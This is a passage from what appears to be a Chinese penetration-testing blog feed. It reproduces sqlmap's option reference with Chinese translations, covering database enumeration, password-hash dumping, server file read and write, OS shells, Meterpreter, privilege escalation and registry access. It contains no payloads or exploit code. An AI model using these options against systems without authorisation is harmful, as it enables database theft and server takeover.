class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line">Enumeration（枚举）:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">These options can be used to enumerate the back-<span class="keyword">end</span> <span class="keyword">database</span> <span class="keyword">management</span> <span class="keyword">system</span> information, structure <span class="keyword">and</span> <span class="keyword">data</span> contained <span class="keyword">in</span> the tables. Moreover you can run your own <span class="keyword">SQL</span> statements</span><br><span class="line"><span class="comment">## 这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-a, <span class="comment">--all Retrieve everything</span></span><br><span class="line"><span class="comment">## 检索一切</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-b, <span class="comment">--banner Retrieve DBMS banner</span></span><br><span class="line"><span class="comment">## 检索数据库管理系统的标识</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--current-user Retrieve DBMS current user</span></span><br><span class="line"><span class="comment">##  检索数据库管理系统的 标识</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--current-db Retrieve DBMS current database</span></span><br><span class="line"><span class="comment">## 检索数据库管理系统当前数据库</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-hostname Retrieve DBMS <span class="keyword">server</span> hostname</span><br><span class="line"><span class="comment">## 检索数据库服务器的主机名</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--is-dba Detect if the DBMS current user is DBA</span></span><br><span class="line"><span class="comment">## 检测DBMS当前用户是否DBA</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--users Enumerate DBMS users</span></span><br><span class="line"><span class="comment">## 枚举数据库管理系统用户</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--passwords Enumerate DBMS users password hashes</span></span><br><span class="line"><span class="comment">## 枚举数据库管理系统用户密码哈希</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--privileges Enumerate DBMS users privileges</span></span><br><span class="line"><span class="comment">## 枚举数据库管理系统用户的权限</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--roles Enumerate DBMS users roles</span></span><br><span class="line"><span class="comment">## 枚举数据库管理系统用户的角色</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--dbs Enumerate DBMS databases</span></span><br><span class="line"><span class="comment">## 枚举数据库管理系统数据库</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--tables Enumerate DBMS database tables</span></span><br><span class="line"><span class="comment">##  枚举的DBMS数据库中的表</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--columns Enumerate DBMS database table columns</span></span><br><span class="line"><span class="comment">## 枚举DBMS数据库表列</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--schema Enumerate DBMS schema</span></span><br><span class="line"><span class="comment">## 枚举数据库架构</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--count Retrieve number of entries for table(s)</span></span><br><span class="line"><span class="comment">## 检索表的条目数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--dump Dump DBMS database table entries</span></span><br><span class="line"><span class="comment">##  转储数据库管理系统的数据库中的表项</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--dump-all Dump all DBMS databases tables entries</span></span><br><span class="line"><span class="comment">## 转储数据库管理系统的数据库中的表项</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--search Search column(s), table(s) and/or database name(s)</span></span><br><span class="line"><span class="comment">##  搜索列（S），表（S）和/或数据库名称（S）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--comments Retrieve DBMS comments</span></span><br><span class="line"><span class="comment">##  检索数据库的comments(注释、评论)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-D DB DBMS <span class="keyword">database</span> <span class="keyword">to</span> enumerate</span><br><span class="line"><span class="comment">## 要进行枚举的数据库名</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-T TBL DBMS <span class="keyword">database</span> <span class="keyword">table</span>(s) <span class="keyword">to</span> enumerate</span><br><span class="line"><span class="comment">##  要进行枚举的数据库表</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-C <span class="keyword">COL</span> DBMS <span class="keyword">database</span> <span class="keyword">table</span> <span class="keyword">column</span>(s) <span class="keyword">to</span> enumerate</span><br><span class="line"><span class="comment">## 要进行枚举的数据库列</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-X EXCLUDECOL DBMS <span class="keyword">database</span> <span class="keyword">table</span> <span class="keyword">column</span>(s) <span class="keyword">to</span> <span class="keyword">not</span> enumerate</span><br><span class="line"><span class="comment">## 要不进行枚举的数据库列</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-U <span class="keyword">USER</span> DBMS <span class="keyword">user</span> <span class="keyword">to</span> enumerate</span><br><span class="line"><span class="comment">## 用来进行枚举的数据库用户</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--exclude-sysdbs Exclude DBMS system databases when enumerating tables</span></span><br><span class="line"><span class="comment">##  枚举表时排除系统数据库</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--pivot-column=P.. Pivot column name</span></span><br><span class="line"><span class="comment">## 主列名称</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--where=DUMPWHERE Use WHERE condition while table dumping</span></span><br><span class="line"><span class="comment">## 使用WHERE条件进行表转储</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--start=LIMITSTART First query output entry to retrieve</span></span><br><span class="line"><span class="comment">##  第一个查询输出进入检索</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--stop=LIMITSTOP Last query output entry to retrieve</span></span><br><span class="line"><span class="comment">## 最后查询的输出进入检索</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--first=FIRSTCHAR First query output word character to retrieve</span></span><br><span class="line"><span class="comment">## 第一个查询输出字的字符检索</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--last=LASTCHAR Last query output word character to retrieve</span></span><br><span class="line"><span class="comment">## 最后查询的输出字字符检索</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--sql-query=QUERY SQL statement to be executed</span></span><br><span class="line"><span class="comment">## 要执行的SQL语句</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--sql-shell Prompt for an interactive SQL shell</span></span><br><span class="line"><span class="comment">## 提示交互式SQL的shell</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--sql-file=SQLFILE Execute SQL statements from given file(s)</span></span><br><span class="line"><span class="comment">## 从给定文件执行SQL语句</span></span><br></pre></td></tr></table></figure><h2 id="Brute-Force（蛮力）"><a href="#Brute-Force（蛮力）" class="headerlink" title="Brute Force（蛮力）"></a>Brute Force（蛮力）</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Brute force（蛮力）:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">These options can be used to run brute force checks</span><br><span class="line"><span class="comment">## 这些选项可以被用来运行蛮力检查。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--common-tables Check existence of common tables</span></span><br><span class="line"><span class="comment">## 检查存在共同表</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--common-columns Check existence of common columns</span></span><br><span class="line"><span class="comment">## 检查存在共同列</span></span><br></pre></td></tr></table></figure><h2 id="User-defined-function-injection（用户自定义函数注入）"><a href="#User-defined-function-injection（用户自定义函数注入）" class="headerlink" title="User-defined function injection（用户自定义函数注入）"></a>User-defined function injection（用户自定义函数注入）</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">User-defined function injection（用户自定义函数注入）:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">These options can be used to <span class="keyword">create</span> custom <span class="keyword">user</span>-defined functions</span><br><span class="line"><span class="comment">## 这些选项可以用来创建用户自定义函数。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--udf-inject Inject custom user-defined functions</span></span><br><span class="line"><span class="comment">## 注入用户自定义函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--shared-lib=SHLIB Local path of the shared library</span></span><br><span class="line"><span class="comment">## 共享库的本地路径</span></span><br></pre></td></tr></table></figure><h2 id="File-system-access（访问文件系统）"><a href="#File-system-access（访问文件系统）" class="headerlink" title="File system access（访问文件系统）"></a>File system access（访问文件系统）</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">File system access（访问文件系统）:</span><br><span class="line">These options can be used to access the back-<span class="keyword">end</span> <span class="keyword">database</span> <span class="keyword">management</span> <span class="keyword">system</span> underlying <span class="keyword">file</span> <span class="keyword">system</span></span><br><span class="line"><span class="comment">## 这些选项可以被用来访问后端数据库管理系统的底层文件系统。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--file-read=RFILE Read a file from the back-end DBMS file system</span></span><br><span class="line"><span class="comment">## 从后端的数据库管理系统文件系统读取文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--file-write=WFILE Write a local file on the back-end DBMS file system</span></span><br><span class="line"><span class="comment">## 编辑后端的数据库管理系统文件系统上的本地文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--file-dest=DFILE Back-end DBMS absolute filepath to write to</span></span><br><span class="line"><span class="comment">## 后端的数据库管理系统写入文件的绝对路径</span></span><br></pre></td></tr></table></figure><h2 id="Operating-system-access（操作系统访问）"><a href="#Operating-system-access（操作系统访问）" class="headerlink" title="Operating system access（操作系统访问）"></a>Operating system access（操作系统访问）</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Operating system access（操作系统访问）:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">These options can be used to access the back-<span class="keyword">end</span> <span class="keyword">database</span> <span class="keyword">management</span> <span class="keyword">system</span> underlying operating <span class="keyword">system</span></span><br><span class="line"><span class="comment">## 这些选项可以用于访问后端数据库管理系统的底层操作系统。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--os-cmd=OSCMD Execute an operating system command</span></span><br><span class="line"><span class="comment">## 执行操作系统命令</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--os-shell Prompt for an interactive operating system shell</span></span><br><span class="line"><span class="comment">##  交互式的操作系统的shell</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--os-pwn Prompt for an OOB shell, Meterpreter or VNC</span></span><br><span class="line"><span class="comment">## 获取一个OOB shell，meterpreter或VNC</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--os-smbrelay One click prompt for an OOB shell, Meterpreter or VNC</span></span><br><span class="line"><span class="comment">## 一键获取一个OOB shell，meterpreter或VNC</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--os-bof Stored procedure buffer overflow exploitation</span></span><br><span class="line"><span class="comment">## 存储过程缓冲区溢出利用</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--priv-esc Database process user privilege escalation</span></span><br><span class="line"><span class="comment">## 数据库进程用户权限提升</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--msf-path=MSFPATH Local path where Metasploit Framework is installed Metasploit Framework</span></span><br><span class="line"><span class="comment">## 本地的安装路径</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--tmp-path=TMPPATH Remote absolute path of temporary files directory</span></span><br><span class="line"><span class="comment">## 远程临时文件目录的绝对路径</span></span><br></pre></td></tr></table></figure><h2 id="Windows-registry-access（Windows注册表访问）"><a href="#Windows-registry-access（Windows注册表访问）" class="headerlink" title="Windows registry access（Windows注册表访问）"></a>Windows registry access（Windows注册表访问）</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Windows registry access（Windows注册表访问）:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">These options can be used to access the back-<span class="keyword">end</span> <span class="keyword">database</span> <span class="keyword">management</span> <span class="keyword">system</span> Windows registry</span><br><span class="line"><span class="comment">## 这些选项可以被用来访问后端数据库管理系统Windows注册表。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--reg-read Read a Windows registry key value</span></span><br><span class="line"><span class="comment">## 读一个Windows注册表项值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--reg-add Write a Windows registry key value data</span></span><br><span class="line"><span class="comment">## 写一个Windows注册表项值数据</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--reg-del Delete a Windows registry key value</span></span><br><span class="line"><span class="comment">## 删除Windows注册表键值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--reg-key=REGKEY Windows registry key</span></span><br><span class="line"><span class="comment">## Windows注册表键</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--reg-value=REGVAL Windows registry key value</span></span><br><span class="line"><span class="comment">##  Windows注册表项值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--reg-data=REGDATA Windows registry key value data</span></span><br><span class="line"><span class="comment">## Windows注册表键值数据</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--reg-type=REGTYPE Windows registry key value type</span></span><br><span class="line"><span class="comment">## Windows注册表项值类型</span></span><br></pre></td></tr></table></figure><h2 id="General（一般）"><a href="#General（一般）" class="headerlink" title="General（一般）"></a>General（一般）</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">General（一般）:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">These options can be used to <span class="keyword">set</span> <span class="keyword">some</span> <span class="keyword">general</span> working <span class="keyword">parameters</span></span><br><span class="line"><span class="comment">## 这些选项可以用来设置一些一般的工作参数。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-s SESSIONFILE <span class="keyword">Load</span> <span class="keyword">session</span> <span class="keyword">from</span> a <span class="keyword">stored</span> (.sqlite) <span class="keyword">file</span></span><br><span class="line"><span class="comment">## 保存和恢复检索会话文件的所有数据</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-t TRAFFICFILE <span class="keyword">Log</span> <span class="keyword">all</span> <span class="keyword">HTTP</span> traffic <span class="keyword">into</span> a textual <span class="keyword">file</span></span><br><span class="line"><span class="comment">## 记录所有HTTP流量到一个文本文件中</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--batch Never ask for user input, use the default behaviour</span></span><br><span class="line"><span class="comment">## 从不询问用户输入，使用所有默认配置。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--binary-fields=.. Result fields having binary values (e.g. "digest")</span></span><br><span class="line"><span class="comment">## 具有二进制值的结果字段</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--charset=CHARSET Force character encoding used for data retrieval</span></span><br><span class="line"><span class="comment">## 强制用于数据检索的字符编码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--crawl=CRAWLDEPTH Crawl the website starting from the target URL</span></span><br><span class="line"><span class="comment">## 从目标网址开始抓取网站</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--crawl-exclude=.. Regexp to exclude pages from crawling (e.g. "logout")</span></span><br><span class="line"><span class="comment">## 正则表达式排除网页抓取</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--csv-del=CSVDEL Delimiting character used in CSV output (default ",")</span></span><br><span class="line"><span class="comment">## 分隔CSV输出中使用的字符</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--dump-format=DU.. Format of dumped data (CSV (default), HTML or SQLITE)</span></span><br><span class="line"><span class="comment">## 转储数据的格式</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--eta Display for each output the estimated time of arrival</span></span><br><span class="line"><span class="comment">## 显示每个输出的预计到达时间</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--flush-session Flush session files for current target</span></span><br><span class="line"><span class="comment">## 刷新当前目标的会话文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--forms Parse and test forms on target URL</span></span><br><span class="line"><span class="comment">## 在目标网址上解析和测试表单</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--fresh-queries Ignore query results stored in session file</span></span><br><span class="line"><span class="comment">## 忽略在会话文件中存储的查询结果</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--hex Use DBMS hex function(s) for data retrieval</span></span><br><span class="line"><span class="comment">## 使用DBMS hex函数进行数据检索</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--output-dir=OUT.. Custom output directory path</span></span><br><span class="line"><span class="comment">## 自定义输出目录路径</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--parse-errors Parse and display DBMS error messages from responses</span></span><br><span class="line"><span class="comment">## 解析和显示响应中的DBMS错误消息</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--save=SAVECONFIG Save options to a configuration INI file</span></span><br><span class="line"><span class="comment">## 保存选项到INI配置文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--scope=SCOPE Regexp to filter targets from provided proxy log</span></span><br><span class="line"><span class="comment">## 使用正则表达式从提供的代理日志中过滤目标</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--test-filter=TE.. Select tests by payloads and/or titles (e.g. ROW)</span></span><br><span class="line"><span class="comment">## 根据有效负载和/或标题(e.g. ROW)选择测试</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--test-skip=TEST.. Skip tests by payloads and/or titles (e.g. BENCHMARK)</span></span><br><span class="line"><span class="comment">## 根据有效负载和/或标题跳过测试（e.g. BENCHMARK）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--update Update sqlmap</span></span><br><span class="line"><span class="comment">## 更新SqlMap</span></span><br></pre></td></tr></table></figure><h2 id="Miscellaneous（杂项）"><a href="#Miscellaneous（杂项）" class="headerlink" title="Miscellaneous（杂项）"></a>Miscellaneous（杂项）</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">Miscellaneous（杂项）:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-z MNEMONICS <span class="keyword">Use</span> <span class="keyword">short</span> mnemonics (e.g. <span class="string">"flu,bat,ban,tec=EU"</span>)</span><br><span class="line"><span class="comment">## 使用简短的助记符</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--alert=ALERT Run host OS command(s) when SQL injection is found</span></span><br><span class="line"><span class="comment">## 在找到SQL注入时运行主机操作系统命令</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--answers=ANSWERS Set question answers (e.g. "quit=N,follow=N")</span></span><br><span class="line"><span class="comment">## 设置问题答案</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--beep Beep on question and/or when SQL injection is found</span></span><br><span class="line"><span class="comment">## 发现SQL 注入时提醒</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--cleanup Clean up the DBMS from sqlmap specific UDF and tables SqlMap</span></span><br><span class="line"><span class="comment">## 具体的UDF和表清理DBMS</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--dependencies Check for missing (non-core) sqlmap dependencies</span></span><br><span class="line"><span class="comment">## 检查是否缺少（非内核）sqlmap依赖关系</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--disable-coloring Disable console output coloring</span></span><br><span class="line"><span class="comment">## 禁用控制台输出颜色</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--gpage=GOOGLEPAGE Use Google dork results from specified page number</span></span><br><span class="line"><span class="comment">## 使用Google dork结果指定页码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--identify-waf Make a thorough testing for a WAF/IPS/IDS protection</span></span><br><span class="line"><span class="comment">## 对WAF / IPS / IDS保护进行全面测试</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--skip-waf Skip heuristic detection of WAF/IPS/IDS protection</span></span><br><span class="line"><span class="comment">## 跳过启发式检测WAF / IPS / IDS保护</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--mobile Imitate smartphone through HTTP User-Agent header</span></span><br><span class="line"><span class="comment">##  通过HTTP User-Agent标头模仿智能手机</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--offline Work in offline mode (only use session data)</span></span><br><span class="line"><span class="comment">## 在离线模式下工作（仅使用会话数据）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--page-rank Display page rank (PR) for Google dork results</span></span><br><span class="line"><span class="comment">##  Google dork结果显示网页排名（PR）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--purge-output Safely remove all content from output directory</span></span><br><span class="line"><span class="comment">##  安全地从输出目录中删除所有内容</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--smart Conduct thorough tests only if positive heuristic(s)</span></span><br><span class="line"><span class="comment">## 只有在正启发式时才进行彻底测试</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--sqlmap-shell Prompt for an interactive sqlmap shell</span></span><br><span class="line"><span class="comment">## 提示交互式 sqlmap shell</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--wizard Simple wizard interface for beginner users</span></span><br><span class="line"><span class="comment">## 给初级用户的简单向导界面</span></span><br></pre></td></tr></table></figure><p>–By <a href="https://micro8.gitbook.io/micro8/contents-1/1-10/5-gong-ju-jie-shao-sqlmap" target="_blank" rel="noopener">Micropoor</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;sqlmap参数经常忘，所以就收集了大佬整理的一份参数详解。方便使用和查询。&lt;/p&gt;
&lt;h2 id=&quot;Options（选项）&quot;&gt;&lt;a href=&quot;#Options（选项）&quot; class=&quot;headerlink&quot; title=&quot;Options（选项）&quot;&gt;&lt;/a&gt;Options
      
    
    </summary>
    
      <category term="渗透测试" scheme="https:///login546.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="工具" scheme="https:///login546.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="sqlmap参数详解" scheme="https:///login546.github.io/tags/sqlmap%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-13272漏洞复现</title>
